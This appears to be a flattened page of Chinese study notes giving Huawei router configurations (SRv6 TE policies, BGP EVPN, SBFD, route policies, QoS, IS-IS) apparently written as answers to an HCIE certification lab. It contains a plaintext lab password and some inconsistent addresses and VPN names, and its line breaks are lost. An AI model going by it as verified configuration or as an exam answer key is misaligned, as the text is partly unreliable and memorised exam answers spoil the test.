class="hljs-comment">#</span>route-policy fz1 permit node 10  apply extcommunity color 0:101<span class="hljs-comment">#</span>route-policy fz2 permit node 10  apply cost 10<span class="hljs-comment">#</span>bgp 65000l2vpn-family evpn  peer FC00::5 route-policy fz1 import  peer FC00::6 route-policy fz2 import<span class="hljs-comment">#</span>tunnel-policy x1-z1  tunnel select-seq ipv6 srv6-te-policy load-balance-number 1<span class="hljs-comment">#</span>ip vpn-instance OA  ipv4-family  tnl-policy x1-z1 evpn<span class="hljs-comment"># SRv6 SBFD部署</span>te ipv6-router-id FC00::Xbfdsbfd  reflector discriminator X.0.0.X 对应自己的 Router-ID  destination ipv6 FC00::5 remote-discriminator 5.0.0.5te ipv6-router-id FC00::Xsegment-routing ipv6srv6-te-policy backup hot-standby <span class="hljs-built_in">enable</span>  srv6-te-policy bfd seamless <span class="hljs-built_in">enable</span>  srv6-te-policy bfd no-bypass  srv6-te-policy bfd min-tx-interval 50<span class="hljs-comment">#考场配置如下：</span>srv6-te-policy seamless-bfd <span class="hljs-built_in">enable</span>srv6-te-policy seamless-bfd min-tx-interval 50<span class="hljs-comment"># 检查</span>dis bfd session alldis srv6-te policy<span class="hljs-comment"># 路径规划实现， OA主路径</span>route-policy MED_OA permit node 10  apply cost 10<span class="hljs-comment">#</span>bgp 65000  ipv4-family vpn-instance OA    peer 10.20.1.1 route-policy MED_OA <span class="hljs-built_in">export</span><span class="hljs-comment">## X_PE2</span>ip vpn-instance OA  route-distinguisher 65001:2  vpn-target 1:4 export-extcommunity evpn  vpn-target 4:1 import-extcommunity evpn<span class="hljs-comment">#</span>interface G0/2/31  ip binding vpn-instance OA  ip address 10.20.1.10 30<span class="hljs-comment">#</span>bgp 65000  ipv4-family vpn-instance OA    advertise l2vpn evpn    segment-routing ipv6 traffic-engineer best-effort evpn    segment-routing ipv6 locator HCIE evpn    peer 10.20.1.9 as-number 65001<span class="hljs-comment"># SRv6 Policy部署</span>segment-routing ipv6  srv6-te-policy locator HCIE  segment-list x2-z2-zhu    index 10 sid ipv6 FC02:2::30  segment-list x2-z2-bei    index 10 sid ipv6 FC02:2::10    index 20 sid ipv6 FC02:1::30    index 30 sid ipv6 FC02:5::10srv6-te policy x2-z2 endpoint FC00::6 Color 102  candidate-path preference 200    segment-list x2-z2-zhu  candidate-path preference 100    segment-list x2-z2-bei<span class="hljs-comment">#</span>route-policy fz1 permit node 10  apply cost 10<span class="hljs-comment">#</span>route-policy fz2 permit node 10  apply extcommunity color 0:102<span class="hljs-comment">#</span>bgp 65000l2vpn-family evpn  peer FC00::5 route-policy fz1 import  peer FC00::6 route-policy fz2 import<span class="hljs-comment">#</span>tunnel-policy x2-z2  tunnel select-seq ipv6 srv6-te-policy load-balance-number 1<span class="hljs-comment">#</span>ip vpn-instance OA  ipv4-family  tnl-policy x2-z2 evpn<span class="hljs-comment"># SRv6 SBFD部署</span>te ipv6-router-id FC00::Xbfdsbfd  reflector discriminator X.0.0.X 对应自己的 Router-ID  destination ipv6 FC00::6 remote-discriminator 6.0.0.6segment-routing ipv6srv6-te-policy backup hot-standby <span class="hljs-built_in">enable</span>  srv6-te-policy bfd seamless <span class="hljs-built_in">enable</span>  srv6-te-policy bfd no-bypass  srv6-te-policy bfd min-tx-interval 50<span class="hljs-comment"># 考场配置如下：</span>srv6-te-policy seamless-bfd <span class="hljs-built_in">enable</span>srv6-te-policy seamless-bfd min-tx-interval 50<span class="hljs-comment"># 检查</span>dis bfd session alldis srv6-te policy<span class="hljs-comment"># 路径规划实现， OA主路径</span>route-policy MED_OA permit node 10  apply cost 12bgp 65000   ipv4-family vpn-instance OA     peer 10.20.1.9 route-policy MED_OA <span class="hljs-built_in">export</span> <span class="hljs-comment">## X_Export1</span>inter G0/0/7  undo portswitch  ip add 10.20.1.1 30inter G0/0/8  ip add 10.20.1.5 30  quitacl 2001  rule permit <span class="hljs-built_in">source</span> 10.1.11.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.12.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.13.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.14.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.15.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.21.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.22.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.23.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.24.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.25.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.31.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.32.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.33.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.34.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.35.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.41.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.42.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.43.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.44.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.45.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.51.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.52.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.53.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.54.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.55.0 0.0.0.255 quitroute-policy b2o permit node 10  apply tag 10route-policy o2b deny node 10  if-match tag 20route-policy o2b permit node 20  if-match acl 2001  quitbgp 65001  router-id 10.1.0.1  peer 10.20.1.2 as 65000  preference 120 255 255  import ospf 1 route-policy o2b  quitospf 1  import bgp route-policy b2o  default cost inherit-metric  area 0    network 10.20.1.5 0.0.0.0    quit  quit<span class="hljs-comment">## X_Export2</span>inter G0/0/7  undo portswitch  ip add 10.20.1.9 30inter G0/0/8  ip add 10.20.1.6 30  quitacl 2001  rule permit <span class="hljs-built_in">source</span> 10.1.11.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.12.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.13.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.14.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.15.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.21.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.22.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.23.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.24.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.25.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.31.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.32.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.33.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.34.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.35.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.41.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.42.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.43.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.44.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.45.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.51.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.52.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.53.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.54.0 0.0.0.255  rule permit <span class="hljs-built_in">source</span> 10.1.55.0 0.0.0.255 quitroute-policy b2o permit node 10  apply tag 20route-policy o2b deny node 10  if-match tag 10route-policy o2b permit node 20  if-match acl 2001  quitbgp 65001  router-id 10.1.0.2  peer 10.20.1.10 as 65000   preference 120 255 255  import ospf 1 route-policy o2b  quitospf 1  import bgp route-policy b2o  default cost inherit-metric  area 0    network 10.20.1.6 0.0.0.0    quit  quit5、[65000, 65003] vpn-instance / IP / BGP EVPN<span class="hljs-comment">## Y_PE1</span>ip vpn-instance OA  route-distinguisher 65003:1  vpn-target 3:4 export-extcommunity evpn  vpn-target 4:3 import-extcommunity evpn<span class="hljs-comment">#</span>ip vpn-instance R&amp;D  route-distinguisher 65003:3  vpn-target 33:44 export-extcommunity evpn  vpn-target 44:33 import-extcommunity evpn<span class="hljs-comment">#</span>interface G0/2/31.10  vlan-type dot1q 10  ip binding vpn-instance OA  ip address 10.20.2.2 30<span class="hljs-comment">#</span>interface G0/2/31.20  vlan-type dot1q 20  ip binding vpn-instance R&amp;D  ip address 10.20.2.6 30<span class="hljs-comment">#</span>bgp 65000  ipv4-family vpn-instance OA    advertise l2vpn evpn    segment-routing ipv6 traffic-engineer best-effort evpn    segment-routing ipv6 locator HCIE evpn    peer 10.20.2.1 as-number 65003  ipv4-family vpn-instance R&amp;D    advertise l2vpn evpn    segment-routing ipv6 traffic-engineer best-effort evpn    segment-routing ipv6 locator HCIE evpn    peer 10.20.2.5 as-number 65003<span class="hljs-comment"># SRv6 Policy部署</span>segment-routing ipv6  srv6-te-policy locator HCIE  segment-list y1-z1-zhu    index 10 sid ipv6 FC02:3::30  segment-list y1-z1-bei    index 10 sid ipv6 FC02:3::10    index 20 sid ipv6 FC02:4::30    index 30 sid ipv6 FC02:6::10srv6-te policy y1-z1 endpoint FC00::5 Color 103  candidate-path preference 200    segment-list y1-z1-zhu    candidate-path preference 100      segment-list y1-z1-bei<span class="hljs-comment">#</span>route-policy fz1 permit node 10  apply extcommunity color 0:103<span class="hljs-comment">#</span>route-policy fz2 permit node 10  apply cost 10<span class="hljs-comment">#</span>bgp 65000l2vpn-family evpn  peer FC00::5 route-policy fz1 import  peer FC00::6 route-policy fz2 import<span class="hljs-comment">#</span>tunnel-policy y1-z1  tunnel select-seq ipv6 srv6-te-policy load-balance-number 1<span class="hljs-comment">#</span>ip vpn-instance OA  ipv4-family  tnl-policy y1-z1 evpn<span class="hljs-comment">#</span>ip vpn-instance R&amp;D  ipv4-family  tnl-policy y1-z1 evpn<span class="hljs-comment"># SRv6 SBFD部署</span>te ipv6-router-id FC00::Xbfdsbfd  reflector discriminator X.0.0.X 对应自己的 Router-ID  destination ipv6 FC00::5 remote-discriminator 5.0.0.5te ipv6-router-id FC00::Xsegment-routing ipv6srv6-te-policy backup hot-standby <span class="hljs-built_in">enable</span>  srv6-te-policy bfd seamless <span class="hljs-built_in">enable</span>  srv6-te-policy bfd no-bypass  srv6-te-policy bfd min-tx-interval 50考场配置如下：srv6-te-policy seamless-bfd <span class="hljs-built_in">enable</span>srv6-te-policy seamless-bfd min-tx-interval 50<span class="hljs-comment"># 检查</span>dis bfd session alldis srv6-te policy<span class="hljs-comment"># 路径规划实现， OA主路径，RD备路径</span>route-policy MED_OA permit node 10   apply cost 10 route-policy MED_RD permit node 10   apply cost 12bgp 65000   ipv4-family vpn-instance OA     peer 10.20.2.1 route-policy MED_OA <span class="hljs-built_in">export</span>  ipv4-family vpn-instance R&amp;D     peer 10.20.2.5 route-policy MED_RD <span class="hljs-built_in">export</span>  <span class="hljs-comment">## Y_PE2</span>ip vpn-instance OA  route-distinguisher 65003:2  vpn-target 3:4 export-extcommunity evpn  vpn-target 4:3 import-extcommunity evpn<span class="hljs-comment">#</span>ip vpn-instance R&amp;D  route-distinguisher 65003:4  vpn-target 33:44 export-extcommunity evpn  vpn-target 44:33 import-extcommunity evpn<span class="hljs-comment">#</span>interface G0/2/31.10  vlan-type dot1q 10  ip binding vpn-instance OA  ip address 10.20.2.10 30<span class="hljs-comment">#</span>interface G0/2/31.20  vlan-type dot1q 20  ip binding vpn-instance R&amp;D  ip address 10.20.2.14 30<span class="hljs-comment">#</span>bgp 65000  ipv4-family vpn-instance OA    advertise l2vpn evpn    segment-routing ipv6 traffic-engineer best-effort evpn    segment-routing ipv6 locator HCIE evpn    peer 10.20.2.9 as-number 65003  ipv4-family vpn-instance R&amp;D    advertise l2vpn evpn    segment-routing ipv6 traffic-engineer best-effort evpn    segment-routing ipv6 locator HCIE evpn    peer 10.20.2.13 as-number 65003<span class="hljs-comment"># SRv6 Policy部署</span>segment-routing ipv6  srv6-te-policy locator HCIE  segment-list y2-z2-zhu    index 10 sid ipv6 FC02:4::30  segment-list y2-z2-bei    index 10 sid ipv6 FC02:4::10    index 20 sid ipv6 FC02:3::30    index 30 sid ipv6 FC02:5::10srv6-te policy y2-z2 endpoint FC00::6 Color 104  candidate-path preference 200    segment-list y2-z2-zhu  candidate-path preference 100    segment-list y2-z2-bei<span class="hljs-comment">#</span>route-policy fz2 permit node 10  apply extcommunity color 0:104<span class="hljs-comment">#</span>route-policy fz1 permit node 10  apply cost 10<span class="hljs-comment">#</span>bgp 65000l2vpn-family evpn  peer FC00::5 route-policy fz1 import  peer FC00::6 route-policy fz2 import<span class="hljs-comment">#</span>tunnel-policy y2-z2  tunnel select-seq ipv6 srv6-te-policy load-balance-number 1<span class="hljs-comment">#</span>ip vpn-instance OA  ipv4-family  tnl-policy y2-z2 evpn<span class="hljs-comment">#</span>ip vpn-instance R&amp;D  ipv4-family  tnl-policy y2-z2 evpn<span class="hljs-comment"># SRv6 SBFD部署</span>te ipv6-router-id FC00::Xbfdsbfd  reflector discriminator X.0.0.X 对应自己的 Router-ID  destination ipv6 FC00::6 remote-discriminator 6.0.0.6segment-routing ipv6srv6-te-policy backup hot-standby <span class="hljs-built_in">enable</span>  srv6-te-policy bfd seamless <span class="hljs-built_in">enable</span>  srv6-te-policy bfd no-bypass  srv6-te-policy bfd min-tx-interval 50<span class="hljs-comment"># 考场配置如下：</span>srv6-te-policy seamless-bfd <span class="hljs-built_in">enable</span>srv6-te-policy seamless-bfd min-tx-interval 50<span class="hljs-comment">## 检查</span>dis bfd session alldis srv6-te policy<span class="hljs-comment"># 路径规划实现， OA备路径，RD主路径</span>route-policy MED_OA permit node 10   apply cost 12 route-policy MED_RD permit node 10   apply cost 10bgp 65000   ipv4-family vpn-instance OA     peer 10.20.2.9 route-policy MED_OA <span class="hljs-built_in">export</span>  ipv4-family vpn-instance R&amp;D     peer 10.20.2.13 route-policy MED_RD <span class="hljs-built_in">export</span> <span class="hljs-comment">## Y_Export</span>ip ip-prefix OA index 10 permit 10.2.0.0 16 greater-equal 24 less-equal 24ip ip-prefix OA index 20 permit 10.100.2.0 24<span class="hljs-comment">#</span>ip ip-prefix RD index 10 permit 10.2.0.0 16 greater-equal 24 less-equal 24ip ip-prefix RD index 20 permit 10.100.3.0 24<span class="hljs-comment">#</span>interface G0/0/7  undo portswitchinterface G0/0/6  undo portswitchinterface G0/0/7.10  dot1q termination vid 10  ip binding vpn-instance vpn2  ip address 10.20.2.1 255.255.255.252interface G0/0/7.20  dot1q termination vid 20  ip binding vpn-instance vpn3  ip address 10.20.2.5 255.255.255.252interface G0/0/6.10  dot1q termination vid 10  ip binding vpn-instance vpn2  ip address 10.20.2.9 255.255.255.252interface G0/0/6.20  dot1q termination vid 20  ip binding vpn-instance vpn3  ip address 10.20.2.13 255.255.255.252<span class="hljs-comment">#</span>bgp 65003  ipv4-family vpn-instance vpn2    peer 10.20.2.2 as-number 65000    peer 10.20.2.2 ip-prefix OA <span class="hljs-built_in">export</span>    peer 10.20.2.10 as-number 65000    peer 10.20.2.10 ip-prefix OA <span class="hljs-built_in">export</span>  ipv4-family vpn-instance vpn3    peer 10.20.2.6 as-number 65000    peer 10.20.2.6 ip-prefix RD <span class="hljs-built_in">export</span>    peer 10.20.2.14 as-number 65000    peer 10.20.2.14 ip-prefix RD <span class="hljs-built_in">export</span>6、[65000, 65004] vpn-instance / IP / BGP EVPN<span class="hljs-comment">## Z_PE1</span>ip vpn-instance OA  route-distinguisher 65004:1  vpn-target 1:4 import-extcommunity evpn  vpn-target 3:4 import-extcommunity evpn  vpn-target 4:1 export-extcommunity evpn  vpn-target 4:3 export-extcommunity evpnip vpn-instance R&amp;D  route-distinguisher 65004:3  vpn-target 44:33 export-extcommunity evpn  vpn-target 33:44 import-extcommunity evpn<span class="hljs-comment">#</span>interface G0/2/31.10  vlan-type dot1q 10  ip binding vpn-instance OA  ip address 10.20.3.2 30interface G0/2/31.20  vlan-type dot1q 20  ip binding vpn-instance R&amp;D  ip address 10.20.3.6 30<span class="hljs-comment">#</span>bgp 65000  ipv4-family vpn-instance OA    advertise l2vpn evpn    segment-routing ipv6 traffic-engineer best-effort evpn    segment-routing ipv6 locator HCIE evpn    peer 10.20.3.1 as-number 65004  ipv4-family vpn-instance R&amp;D    advertise l2vpn evpn    segment-routing ipv6 traffic-engineer best-effort evpn    segment-routing ipv6 locator HCIE evpn    peer 10.20.3.5 as-number 65004<span class="hljs-comment"># SRv6 Policy部署</span>segment-routing ipv6  srv6-te-policy locator HCIE   segment-list z1-x1-zhu    index 10 sid ipv6 FC02:5::20  segment-list z1-x1-bei    index 10 sid ipv6 FC02:5::10    index 20 sid ipv6 FC02:6::20    index 30 sid ipv6 FC02:2::10srv6-te policy z1-x1 endpoint FC00::1 Color 101  candidate-path preference 200    segment-list z1-x1-zhu  candidate-path preference 100    segment-list z1-x1-bei    quit  quitsegment-list z1-y1-zhu  index 10 sid ipv6 FC02:5::30segment-list z1-y1-bei  index 10 sid ipv6 FC02:5::10  index 20 sid ipv6 FC02:6::30  index 30 sid ipv6 FC02:4::10srv6-te policy z1-y1 endpoint FC00::3 Color 103  candidate-path preference 200    segment-list z1-y1-zhu  candidate-path preference 100    segment-list z1-y1-bei<span class="hljs-comment">#</span>route-policy fx1 permit node 10  apply extcommunity color 0:101<span class="hljs-comment">#</span>route-policy fx2 permit node 10  apply cost 10<span class="hljs-comment">#</span>route-policy fy1 permit node 10  apply extcommunity color 0:103<span class="hljs-comment">#</span>route-policy fy2 permit node 10  apply cost 10<span class="hljs-comment">#</span>bgp 65000l2vpn-family evpn  peer FC00::1 route-policy fx1 import  peer FC00::2 route-policy fx2 import  peer FC00::3 route-policy fy1 import  peer FC00::4 route-policy fy2 import<span class="hljs-comment">#</span>tunnel-policy z1-xy1  tunnel select-seq ipv6 srv6-te-policy load-balance-number 1<span class="hljs-comment">#</span>ip vpn-instance OA  ipv4-family  tnl-policy z1-xy1 evpn<span class="hljs-comment">#</span>ip vpn-instance R&amp;D  ipv4-family  tnl-policy z1-xy1 evpn<span class="hljs-comment"># SRv6 SBFD部署</span>te ipv6-router-id FC00::5bfdsbfd  reflector discriminator 5.0.0.5 对应自己的 Router-ID  destination ipv6 FC00::1 remote-discriminator 1.0.0.1  destination ipv6 FC00::3 remote-discriminator 3.0.0.3segment-routing ipv6  srv6-te-policy backup hot-standby <span class="hljs-built_in">enable</span>  srv6-te-policy bfd seamless <span class="hljs-built_in">enable</span>  srv6-te-policy bfd no-bypass  srv6-te-policy bfd min-tx-interval 50<span class="hljs-comment">#考场配置如下：</span>srv6-te-policy seamless-bfd <span class="hljs-built_in">enable</span>srv6-te-policy seamless-bfd min-tx-interval 50<span class="hljs-comment"># 检查</span>dis bfd session alldis srv6-te policy<span class="hljs-comment">## 路径规划实现， OA主路径，RD备路径</span>route-policy MED_OA permit node 10   apply cost 10 route-policy MED_RD permit node 10  apply cost 12bgp 65000   ipv4-family vpn-instance OA     peer 10.20.3.1 route-policy MED_OA <span class="hljs-built_in">export</span>  ipv4-family vpn-instance R&amp;D    peer 10.20.3.5 route-policy MED_RD <span class="hljs-built_in">export</span><span class="hljs-comment">## Z_PE2</span>ip vpn-instance OA  route-distinguisher 65004:2  vpn-target 1:4 import-extcommunity evpn  vpn-target 3:4 import-extcommunity evpn  vpn-target 4:1 export-extcommunity evpn  vpn-target 4:3 export-extcommunity evpn<span class="hljs-comment">#</span>ip vpn-instance R&amp;D  route-distinguisher 65004:4  vpn-target 44:33 export-extcommunity evpn  vpn-target 33:44 import-extcommunity evpn<span class="hljs-comment">#</span>interface G0/2/31.10  vlan-type dot1q 10  ip binding vpn-instance OA  ip address 10.20.3.10 30<span class="hljs-comment">#</span>interface G0/2/31.20  vlan-type dot1q 20  ip binding vpn-instance R&amp;D  ip address 10.20.3.14 30<span class="hljs-comment">#</span>bgp 65000  ipv4-family vpn-instance OA    advertise l2vpn evpn    segment-routing ipv6 traffic-engineer best-effort evpn    segment-routing ipv6 locator HCIE evpn    peer 10.20.3.9 as-number 65004  ipv4-family vpn-instance R&amp;D    advertise l2vpn evpn    segment-routing ipv6 traffic-engineer best-effort evpn    segment-routing ipv6 locator HCIE evpn    peer 10.20.3.13 as-number 65004<span class="hljs-comment"># SRv6 Policy部署</span>segment-routing ipv6  srv6-te-policy locator HCIE  segment-list z2-x2-zhu    index 10 sid ipv6 FC02:6::20  segment-list z2-x2-bei    index 10 sid ipv6 FC02:6::10    index 20 sid ipv6 FC02:5::20    index 30 sid ipv6 FC02:1::10srv6-te policy z2-x2 endpoint FC00::2 Color 102  candidate-path preference 200    segment-list z2-x2-zhu  candidate-path preference 100    segment-list z2-x2-bei    quit  quitsegment-list z2-y2-zhu  index 10 sid ipv6 FC02:6::30segment-list z2-y2-bei  index 10 sid ipv6 FC02:6::10  index 20 sid ipv6 FC02:5::30  index 30 sid ipv6 FC02:3::10srv6-te policy z2-y2 endpoint FC00::4 Color 104  candidate-path preference 200    segment-list z2-y2-zhu  candidate-path preference 100    segment-list z2-y2-bei<span class="hljs-comment">#</span>route-policy fx1 permit node 10  apply cost 10<span class="hljs-comment">#</span>route-policy fx2 permit node 10  apply extcommunity color 0:102<span class="hljs-comment">#</span>route-policy fy1 permit node 10  apply cost 10<span class="hljs-comment">#</span>route-policy fy2 permit node 10  apply extcommunity color 0:104<span class="hljs-comment">#</span>bgp 65000l2vpn-family evpn  peer FC00::1 route-policy fx1 import  peer FC00::2 route-policy fx2 import  peer FC00::3 route-policy fy1 import  peer FC00::4 route-policy fy2 import<span class="hljs-comment">#</span>tunnel-policy z2-xy2  tunnel select-seq ipv6 srv6-te-policy load-balance-number 1<span class="hljs-comment">#</span>ip vpn-instance OA  ipv4-family  tnl-policy z2-xy2 evpn<span class="hljs-comment">#</span>ip vpn-instance R&amp;D  ipv4-family  tnl-policy z2-xy2 evpn<span class="hljs-comment"># SRv6 SBFD部署</span>te ipv6-router-id FC00::6bfdsbfd  reflector discriminator 6.0.0.6 对应自己的 Router-ID  destination ipv6 FC00::2 remote-discriminator 2.0.0.2  destination ipv6 FC00::4 remote-discriminator 4.0.0.4segment-routing ipv6  srv6-te-policy backup hot-standby <span class="hljs-built_in">enable</span>  srv6-te-policy bfd seamless <span class="hljs-built_in">enable</span>  srv6-te-policy bfd no-bypass  srv6-te-policy bfd min-tx-interval 50<span class="hljs-comment">#考场配置如下：</span>srv6-te-policy seamless-bfd <span class="hljs-built_in">enable</span>srv6-te-policy seamless-bfd min-tx-interval 50<span class="hljs-comment"># 检查</span>dis bfd session alldis srv6-te policy<span class="hljs-comment">## 路径规划实现， OA备路径，RD主路径</span>route-policy MED_OA permit node 10   apply cost 12route-policy MED_RD permit node 10   apply cost 10bgp 65000   ipv4-family vpn-instance OA     peer 10.20.3.9 route-policy MED_OA <span class="hljs-built_in">export</span>  ipv4-family vpn-instance R&amp;D     peer 10.20.2.13 route-policy MED_RD <span class="hljs-built_in">export</span><span class="hljs-comment">## Z_Export1</span>sysname Z_Export1<span class="hljs-comment"># </span>ip vpn-instance OA  route-distinguisher 65004:10ip vpn-instance RD  route-distinguisher 65004:20  quitint lo0  ip binding vpn-instance OA  ip add 10.3.101.254 24int lo1  ip binding vpn-instance R&amp;D  ip add 10.3.99.254 24int lo2  ip binding vpn-instance R&amp;D  ip add 10.3.100.254 24  quitint E 0/0/7  undo portswitchint E 0/0/6  undo portswitchint E 0/0/7.10  dot1q termination vid 10  ip binding vpn-instance OA  ip add 10.20.3.1 30  arp broadcast <span class="hljs-built_in">enable</span>int E 0/0/7.20  dot1q termination vid 20  ip binding vpn-instance R&amp;D  ip add 10.20.3.5 30  arp broadcast <span class="hljs-built_in">enable</span>int E 0/0/6.10  dot1q termination vid 10  ip binding vpn-instance OA  ip add 10.20.3.9 30  arp broadcast <span class="hljs-built_in">enable</span>int E 0/0/6.20  dot1q termination vid 20  ip binding vpn-instance R&amp;D  ip add 10.20.3.13 30  arp broadcast <span class="hljs-built_in">enable</span>bgp 65004  router-id 10.3.99.254  ipv4-family vpn-instance OA    network 10.3.101.0 24    peer 10.20.3.2 as-number 65000    peer 10.20.3.10 as-number 65000  ipv4-family vpn-instance R&amp;D    network 10.3.99.0 24    network 10.3.100.0 24    peer 10.20.3.6 as-number 65000    peer 10.20.3.14 as-number 65000    quit  quit<span class="hljs-comment"># 检查</span>dis bgp peerdis bgp vpnv4 all peerdis vpnv4 vpn-instance OA routing-tabledis vpnv4 vpn-instance R&amp;D routing-table7、VPN FRR部署 / 部署 QOS<span class="hljs-comment">## VPN FRR部署</span><span class="hljs-comment"># X/Y_PE1</span>bgp 65000  ipv4-family vpn-instance OA    auto-frr \\使能 VPN FRR<span class="hljs-comment">## 部署QOS</span>acl number 3001  rule permit ip <span class="hljs-built_in">source</span> 10.2.11.0 0.0.0.255  rule permit ip <span class="hljs-built_in">source</span> 10.2.12.0 0.0.0.255  rule permit ip <span class="hljs-built_in">source</span> 10.2.13.0 0.0.0.255  rule permit ip <span class="hljs-built_in">source</span> 10.2.14.0 0.0.0.255  rule permit ip <span class="hljs-built_in">source</span> 10.2.15.0 0.0.0.255  description rdacl number 3002  rule permit ip <span class="hljs-built_in">source</span> 10.2.21.0 0.0.0.255  rule permit ip <span class="hljs-built_in">source</span> 10.2.22.0 0.0.0.255  rule permit ip <span class="hljs-built_in">source</span> 10.2.23.0 0.0.0.255  rule permit ip <span class="hljs-built_in">source</span> 10.2.24.0 0.0.0.255  rule permit ip <span class="hljs-built_in">source</span> 10.2.25.0 0.0.0.255  description producttraffic classifier rd  if-match acl 3001traffic classifier pro  if-match acl 3002traffic behavior pro  remark dscp ef  queue llq bandwidth 100000traffic behavior rd  remark dscp af41  queue af bandwidth 300000traffic policy RD  classifier rd behavior rd  classifier pro behavior prointerface GigabitEthernet0/0/6.20  traffic-policy RD outboundinterface GigabitEthernet0/0/7.20  traffic-policy RD outbound<span class="hljs-comment">## Y_PE1/2</span>interface G0/2/31.20   trust upstream default <span class="hljs-comment"># 信任 QOS 映射</span><span class="hljs-comment">## ALL PE</span>flow-wred drop  color green low-limit 70 high-limit 90 discard-percentage 50  color yellow low-limit 60 high-limit 90 discard-percentage 50  color red low-limit 50 high-limit 90 discard-percentage 100flow-queue QOS  queue af4 wfq weight 10 flow-wred drop  queue ef pq flow-wred dropqos-profile QOS  user-queue cir 1000000 pir 1000000 flow-queue QOSinterface G0/2/28  qos-profile QOS outboundinterface G0/2/29  qos-profile QOS outboundinterface G0/2/30  qos-profile QOS outbound<span class="hljs-comment"># Z_PE1/2</span>int G0/2/31.20  qos-profile QOS outboundSRv6配置整理1、ISIS/SR/BGP EVPN<span class="hljs-comment">## network-entity 49.0001.00X0.0000.000X.00</span>isis 1  is-level level-2  cost-style wide  network-entity 49.0001.0010.0000.0001.00  domain-authentication-mode md5 cipher Huawei@123  ipv6 <span class="hljs-built_in">enable</span> topology ipv6  ipv6 bfd all-interfaces <span class="hljs-built_in">enable</span>  ipv6 bfd all-interfaces min-tx-interval 15 min-rx-interval 15  <span class="hljs-comment">#SR</span>  segment-routing ipv6 locator HCIE  avoid-microloop frr-protected  ipv6 avoid-microloop segment-routing  ipv6 frr    loop-free-alternate level-2interface LoopBack0  isis ipv6 <span class="hljs-built_in">enable</span> 1interface GigabitEthernet0/2/28  isis ipv6 <span class="hljs-built_in">enable</span> 1  isis circuit-type p2p  isis authentication-mode md5 cipher Huawei@123  isis ppp-negotiation 2-wayinterface GigabitEthernet0/2/29  isis ipv6 <span class="hljs-built_in">enable</span> 1  isis circuit-type p2p  isis authentication-mode md5 cipher Huawei@123  isis ppp-negotiation 2-wayinterface GigabitEthernet0/2/28  isis ipv6 <span class="hljs-built_in">enable</span> 1  isis circuit-type p2p  isis authentication-mode md5 cipher Huawei@123  isis ppp-negotiation 2-wayinterface GigabitEthernet0/2/30  isis ipv6 <span class="hljs-built_in">enable</span> 1  isis ipv6 cost 4  isis circuit-type p2p  isis authentication-mode md5 cipher Huawei@123  isis ppp-negotiation 2-way<span class="hljs-comment">## SR</span><span class="hljs-comment">#  encapsulation source-address FC00::X</span><span class="hljs-comment">#  locator HCIE ipv6-prefix FC02:X:: 96 static 16</span>segment-routing ipv6  sr-te frr <span class="hljs-built_in">enable</span>  encapsulation source-address FC00::1  locator HCIE ipv6-prefix FC02:1:: 96 static 16    <span class="hljs-comment"># Opcode静态部署，考场不用加PSP</span>    opcode ::1 end psp    opcode ::10 end-x interface GigabitEthernet0/2/30 nexthop FC01:10::A psp    opcode ::20 end-x interface GigabitEthernet0/2/28 nexthop FC01:10::2 psp    opcode ::30 end-x interface GigabitEthernet0/2/29 nexthop FC01:10::6 psp    opcode ::100 end-op<span class="hljs-comment">## BGP EVPN邻居部署</span><span class="hljs-comment"># Z_PE1/2</span>bgp 65000  router-id 5.0.0.5  peer FC00::1 as-number 65000  peer FC00::1 connect-interface LoopBack0  peer FC00::1 password cipher Huawei@123  peer FC00::2 as-number 65000  peer FC00::2 connect-interface LoopBack0  peer FC00::2 password cipher Huawei@123  peer FC00::3 as-number 65000  peer 